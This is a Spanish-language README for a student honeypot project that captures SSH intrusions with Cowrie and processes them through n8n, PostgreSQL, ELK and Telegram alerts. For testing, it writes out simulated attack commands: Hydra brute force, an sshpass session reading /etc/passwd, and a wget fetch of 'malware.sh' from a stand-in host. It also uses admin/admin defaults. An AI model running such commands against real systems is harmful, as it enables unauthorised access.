# 🛡️ Proyecto 08 — Implementación y Monitoreo Automatizado de Honeypots

**Grupo:** Oscorp  
**Integrantes:** López, Santiago — Morato, Elizabeth  
**Carrera:** Tecnicatura en Programación  
**Año:** 2026  
**Tutores:** Ariel Enferrel — Alberto Cortez

---

## 📌 Descripción del Proyecto

Este proyecto implementa un sistema **completamente automatizado** de monitoreo de honeypots (pipeline SOAR-lite) capaz de capturar, procesar, almacenar, visualizar y alertar sobre eventos de intrusión SSH en tiempo real, sin intervención manual.

El sistema utiliza el honeypot **Cowrie** para simular un servidor SSH vulnerable, **n8n** para automatizar el procesamiento de logs cada 60 segundos, **PostgreSQL** para almacenamiento estructurado, **ELK Stack** (Elasticsearch + Kibana) para análisis y visualización, y un **bot de Telegram** para alertas automáticas en tiempo real.

El honeypot está desplegado en un **VPS en DigitalOcean (Amsterdam)** con IP pública real, capturando ataques reales de internet las 24 horas. El pipeline de procesamiento corre localmente y sincroniza los logs del VPS cada 55 segundos.

---

## 🏗️ Arquitectura del Sistema

```
Internet (bots y atacantes reales)
           ↓
VPS DigitalOcean Amsterdam — IP: 167.71.8.253
Honeypot Cowrie (puerto 2222) — activo 24/7
           ↓
Script sync_vps.ps1 (cada 55 seg)
           ↓
PC Local — cowrie_vps.json
           ↓
n8n (Schedule Trigger — cada 60 segundos)
    ├── PostgreSQL (almacenamiento histórico)
    ├── Elasticsearch (análisis en tiempo real)
    └── Telegram (alertas automáticas)
                ↓
            Kibana
              ├── Distribución de Comandos
              ├── Top IPs de Origen
              ├── Actividad Temporal
              └── Indicadores de Compromiso (IoCs)
```

---

## 🧰 Tecnologías Utilizadas

| Herramienta     | Versión   | Función                               |
|-----------------|-----------|---------------------------------------|
| Docker          | 29+       | Contenedorización del entorno         |
| Cowrie          | 2.9+      | Honeypot SSH de media interacción     |
| PostgreSQL      | 15        | Base de datos relacional              |
| n8n             | latest    | Automatización de flujos (SOAR-lite)  |
| Elasticsearch   | 8.13.0    | Motor de búsqueda y análisis          |
| Kibana          | 8.13.0    | Visualización de datos                |
| Telegram Bot    | API v6+   | Alertas automáticas en tiempo real    |
| DigitalOcean VPS| Ubuntu 24 | Exposición del honeypot a internet    |

---

## ✅ Requisitos Previos

Antes de comenzar, asegurate de tener instalado:

- **Docker Desktop** — https://www.docker.com/products/docker-desktop
- **Git** — https://git-scm.com/download/win
- **DBeaver Community** (opcional, para ver la base de datos) — https://dbeaver.io/download/

**Recursos mínimos recomendados:**
- RAM: 8 GB (se recomiendan 12 GB)
- Disco: 10 GB libres
- Sistema operativo: Windows 10/11, Linux o macOS

---

## 🚀 Instalación y Configuración

### Paso 1 — Clonar el repositorio

```bash
git clone https://github.com/ElizabethMorato/Proyecto-honeypots.git
cd Proyecto-honeypots
```

### Paso 2 — Levantar todos los servicios

```bash
docker start friendly_kalam db-honeypot n8n elasticsearch kibana
```

Si es la primera vez y los contenedores no existen, crearlos con:

```bash
# PostgreSQL
docker run --name db-honeypot -e POSTGRES_USER=admin -e POSTGRES_PASSWORD=admin -e POSTGRES_DB=honeypot -p 5433:5432 -d postgres

# n8n
docker run -it --name n8n -p 5678:5678 -v "C:\Ruta\Al\Proyecto\logs":/home/node/.n8n-files/logs n8nio/n8n

# Elasticsearch
docker run -d --name elasticsearch -p 9200:9200 -e "discovery.type=single-node" -e "xpack.security.enabled=false" -e "ES_JAVA_OPTS=-Xms512m -Xmx512m" elasticsearch:8.13.0

# Kibana
docker run -d --name kibana -p 5601:5601 -e "ELASTICSEARCH_HOSTS=http://host.docker.internal:9200" kibana:8.13.0

# Cowrie (honeypot local para pruebas)
docker run -d -p 2222:2222 --name friendly_kalam -v "C:\Ruta\Al\Proyecto\logs":/cowrie/cowrie-git/var/log/cowrie cowrie/cowrie
```

> ⚠️ Reemplazar `C:\Ruta\Al\Proyecto\logs` por la ruta real de la carpeta `logs` del repositorio clonado.

### Paso 3 — Verificar que todos los contenedores estén activos

```bash
docker ps
```

Deberías ver los 5 contenedores con estado `Up`.

### Paso 4 — Crear la tabla en PostgreSQL

```bash
docker exec -it db-honeypot psql -U admin -d honeypot -c "
CREATE TABLE IF NOT EXISTS eventos (
  id SERIAL PRIMARY KEY,
  timestamp TIMESTAMP,
  src_ip VARCHAR(50),
  username VARCHAR(100),
  password VARCHAR(100),
  command TEXT,
  hash VARCHAR(255),
  client_version VARCHAR(255),
  session VARCHAR(100)
);"
```

### Paso 5 — Verificar los servicios

| Servicio       | URL                     | Resultado esperado              |
|----------------|-------------------------|---------------------------------|
| n8n            | http://localhost:5678   | Interfaz de automatización      |
| Kibana         | http://localhost:5601   | Panel de visualización          |
| Elasticsearch  | http://localhost:9200   | JSON con info del cluster       |
| PostgreSQL     | localhost:5433          | Conectar desde DBeaver          |

---

## 🔧 Configuración de n8n

### Importar el workflow

1. Abrir http://localhost:5678
2. Ir a **Workflows → Import from file**
3. Seleccionar el archivo `scripts/workflow_honeypot.json`

### Configurar las credenciales en cada nodo

**Nodo PostgreSQL:**

| Campo    | Valor                  |
|----------|------------------------|
| Host     | host.docker.internal   |
| Port     | 5433                   |
| Database | honeypot               |
| User     | admin                  |
| Password | admin                  |

**Nodo Elasticsearch:**

| Campo    | Valor                            |
|----------|----------------------------------|
| Base URL | http://host.docker.internal:9200 |

**Nodo Telegram:** Ver sección completa abajo.

### Activar el workflow

Hacer clic en el botón **Publish** arriba a la derecha. El Schedule Trigger se activa automáticamente cada 60 segundos.

---

## 📲 Configuración de Alertas por Telegram

> ⚠️ Cada integrante/evaluador debe crear su **propio bot personal**. No compartir tokens.

### Paso 1 — Crear el bot con BotFather

1. Abrir Telegram y buscar **@BotFather**
2. Escribir `/newbot`
3. Ingresar un nombre para el bot: `Honeypot Alertas`
4. Ingresar un username terminado en `bot`: por ejemplo `honeypot_prueba_bot`
5. BotFather devuelve un **token** con formato: `1234567890:AAHdqTcvCH1vGBJ29bq...`
6. Guardar ese token.

### Paso 2 — Obtener el Chat ID

1. Enviar cualquier mensaje al bot recién creado
2. Abrir en el navegador (reemplazar TOKEN):
```
https://api.telegram.org/botTOKEN/getUpdates
```
3. Buscar el número en el campo `"id"` dentro de `"chat"`. Ese es el **Chat ID**.

### Paso 3 — Configurar el nodo Telegram en n8n

1. En el workflow hacer clic en el nodo **Send a text message**
2. En **Credential** crear nueva credencial con el token propio
3. En **Chat ID** ingresar el Chat ID propio
4. Guardar y republicar el workflow

---

## 🖥️ Modo 1 — Demo Local (sin VPS)

Este modo permite probar el sistema completo con ataques simulados desde la propia máquina. No requiere conexión al VPS.

### Verificar que el nodo Read File apunta al archivo local

En n8n, el nodo **Read/Write Files from Disk** debe tener esta ruta:
```
/home/node/.n8n-files/logs/cowrie.json
```

### Simular un ataque manual

```bash
ssh root@localhost -p 2222
```

Ingresar cualquier contraseña y ejecutar:
```bash
whoami
cat /etc/passwd
wget http://example.com/malware.sh
exit
```

### Verificar la detección

Esperar 60 segundos. El sistema debe:
- Insertar los eventos en PostgreSQL
- Indexarlos en Elasticsearch
- Mostrarlos en Kibana
- Enviar alertas a Telegram (para login exitoso y descarga de archivo)

### Simular un ataque automatizado con Hydra (desde VM Ubuntu)

Si se tiene una VM Ubuntu con Hydra instalado:

```bash
# Instalar Hydra en Ubuntu
sudo apt install hydra -y

# Ejecutar ataque de fuerza bruta
hydra -l root -P /ruta/passwords.txt ssh://IP_HOST:2222 -t 4
```

El archivo `scripts/passwords.txt` contiene un diccionario de contraseñas comunes para las pruebas.

---
### Simular un ataque automatizado con sshpass (sesiones completas con comandos)

sshpass permite automatizar sesiones SSH completas simulando un atacante que ingresa al sistema y ejecuta comandos de reconocimiento y descarga de archivos. A diferencia de Hydra que solo prueba credenciales, sshpass simula el comportamiento post-explotación del atacante.

**Requiere una VM Ubuntu en VirtualBox.**

#### Instalar sshpass en Ubuntu

```bash
sudo apt install sshpass -y
```

#### Ejecutar una sesión completa de ataque

```bash
sshpass -p "admin" ssh -o StrictHostKeyChecking=no \
  -o ConnectTimeout=5 -p 2222 root@IP_HOST \
  "whoami; cat /etc/passwd; wget http://example.com/malware.sh; exit"
```

Reemplazar `IP_HOST` por la IP del sistema Windows donde corre el honeypot. Obtenerla con `ipconfig` buscando la sección Wi-Fi.

#### Ejecutar el experimento completo de 40 sesiones

El archivo `scripts/experimento_40.sh` automatiza 40 sesiones de ataque combinando Hydra (fuerza bruta) y sshpass (sesiones con comandos):

```bash
# Dar permisos de ejecución
chmod +x /home/[usuario]/experimento_40.sh

# Copiar el diccionario de contraseñas
cp scripts/passwords.txt /home/[usuario]/passwords.txt

# Ejecutar el experimento
bash scripts/experimento_40.sh
```

El script genera dos fases:
- **Fase 1:** 20 intentos de fuerza bruta con Hydra probando credenciales del diccionario
- **Fase 2:** 20 sesiones completas con sshpass ejecutando comandos de reconocimiento y descargas

Al finalizar el experimento el sistema habrá registrado más de 100 eventos en PostgreSQL y Kibana, y habrán llegado entre 15 y 25 alertas automáticas a Telegram.
---

## 🌐 Modo 2 — Con VPS (datos reales de internet)

Este modo conecta el sistema local al VPS del proyecto donde el honeypot recibe ataques reales de bots de todo el mundo.

> ⚠️ Este modo requiere coordinación con el grupo OSCORP para agregar la clave SSH del evaluador al servidor.

### Requisito: clave SSH configurada

El evaluador debe generar una clave SSH y enviarla al grupo para que sea agregada al servidor:

```powershell
# En PowerShell de Windows
ssh-keygen -t rsa -b 4096 -f C:\Users\[USUARIO]\.ssh\id_rsa_vps
type C:\Users\[USUARIO]\.ssh\id_rsa_vps.pub
```

El contenido del archivo `.pub` debe enviarse al grupo para ser registrado en el servidor.

### Crear el script de sincronización

Crear el archivo `scripts/sync_vps.ps1` con el siguiente contenido (reemplazar `[USUARIO]`):

```powershell
while ($true) {
    scp -i C:\Users\[USUARIO]\.ssh\id_rsa_vps `
        root@167.71.8.253:/opt/honeypot/logs/cowrie.json `
        C:\Proyecto-honeypots\logs\cowrie_vps.json
    Write-Host "$(Get-Date) - cowrie_vps.json sincronizado desde VPS"
    Start-Sleep -Seconds 55
}
```

Ejecutar en PowerShell:

```powershell
powershell -ExecutionPolicy Bypass -File C:\Proyecto-honeypots\scripts\sync_vps.ps1
```

### Actualizar el nodo Read File en n8n

En el nodo **Read/Write Files from Disk** cambiar la ruta a:
```
/home/node/.n8n-files/logs/cowrie_vps.json
```

### Resetear el timestamp inicial (primera vez)

En el nodo **Code in JavaScript** reemplazar temporalmente la línea del timestamp por:
```javascript
const lastTimestamp = '1970-01-01T00:00:00.000Z';
```

Publicar el workflow, esperar un ciclo, verificar que procesa eventos y restaurar la línea original:
```javascript
const lastTimestamp = $getWorkflowStaticData('global').lastTimestamp || '1970-01-01T00:00:00.000Z';
```

---

## 📊 Dashboards en Kibana

### Configurar Data View

1. Ir a http://localhost:5601
2. Ir a **Stack Management → Data Views → Create data view**
3. Configurar:

| Campo           | Valor               |
|-----------------|---------------------|
| Name            | eventos_honeypot    |
| Index pattern   | eventos_honeypot*   |
| Timestamp field | timestamp           |

### Dashboards disponibles

| Panel                         | Tipo   | Descripción                           |
|-------------------------------|--------|---------------------------------------|
| Distribución de Comandos      | Dona   | Comandos ejecutados por atacantes     |
| Top IPs de Origen             | Tabla  | IPs que más atacaron                  |
| Actividad Temporal de Ataques | Barras | Ataques por día/hora                  |
| Indicadores de Compromiso     | Tabla  | Hashes SHA-256 de archivos maliciosos |

> ⚠️ Ajustar el filtro de tiempo en Kibana para que abarque el rango de los datos disponibles.

---

## 🗄️ Estructura del Repositorio

```
Proyecto-honeypots/
├── docker/
│   └── docker-compose.yml           → Configuración de contenedores
├── database/
│   └── schema.sql                   → Script SQL para crear la tabla eventos
├── scripts/
│   ├── workflow_honeypot.json       → Workflow de n8n (importar en n8n)
│   ├── experimento_40.sh            → Script de ataque automatizado (Ubuntu)
│   ├── passwords.txt                → Diccionario de contraseñas para Hydra
│   └── sync_vps.ps1                 → Script de sincronización con VPS
├── logs/
│   └── cowrie.json                  → Logs del honeypot local
└── README.md                        → Este archivo
```

---

## 🔄 Comandos de Gestión

### Levantar el sistema

```bash
docker start friendly_kalam db-honeypot n8n elasticsearch kibana
```

### Detener el sistema

```bash
docker stop friendly_kalam db-honeypot n8n elasticsearch kibana
```

### Ver estado de los contenedores

```bash
docker ps
```

### Limpiar logs antes de una demo

```bash
docker stop friendly_kalam
echo. > C:\Proyecto-honeypots\logs\cowrie.json
docker start friendly_kalam
```

---

## 🗃️ Acceso a la Base de Datos

### Desde DBeaver

| Campo    | Valor     |
|----------|-----------|
| Host     | localhost |
| Port     | 5433      |
| Database | honeypot  |
| User     | admin     |
| Password | admin     |

> Si aparece error de zona horaria agregar `-Duser.timezone=UTC` al archivo `dbeaver.ini`.

### Consultas útiles

```sql
-- Todos los eventos del día de hoy
SELECT * FROM eventos
WHERE timestamp > '2026-04-21 00:00:00'
ORDER BY timestamp DESC;

-- Logins exitosos
SELECT timestamp, src_ip, username, password
FROM eventos
WHERE username IS NOT NULL
ORDER BY timestamp DESC;

-- Comandos ejecutados
SELECT timestamp, src_ip, command
FROM eventos
WHERE command IS NOT NULL
ORDER BY timestamp DESC;

-- Conteo de eventos por IP
SELECT src_ip, COUNT(*) as total
FROM eventos
GROUP BY src_ip
ORDER BY total DESC;

-- Indicadores de compromiso (hashes)
SELECT hash, COUNT(*) as descargas
FROM eventos
WHERE hash IS NOT NULL
GROUP BY hash
ORDER BY descargas DESC;
```

---

## ⚠️ Consideraciones de Seguridad y Éticas

- Este sistema está diseñado exclusivamente para uso en **entornos controlados de laboratorio**.
- El honeypot Cowrie simula un servidor vulnerable. Toda interacción con él queda registrada con fines académicos.
- La información recolectada (IPs, credenciales, comandos) se usa exclusivamente para el estudio de tácticas adversarias.
- Elasticsearch tiene la seguridad desactivada (`xpack.security.enabled=false`) para facilitar el laboratorio.
- Cada operador debe usar su **propio bot de Telegram**. No compartir tokens de acceso.
- **Está prohibido** usar este sistema para monitorear redes ajenas o atacar sistemas sin autorización explícita.

---

## 📚 Referencias

- Cowrie Honeypot: https://github.com/cowrie/cowrie
- n8n Documentation: https://docs.n8n.io
- Elasticsearch Guide: https://www.elastic.co/guide
- Kibana Guide: https://www.elastic.co/kibana
- PostgreSQL Documentation: https://www.postgresql.org/docs
- Telegram Bot API: https://core.telegram.org/bots/api
- DigitalOcean Documentation: https://docs.digitalocean.com

---

## 📄 Licencia

Proyecto académico — Tecnicatura en Programación — 2026  
Grupo Oscorp — López, Santiago & Morato, Elizabeth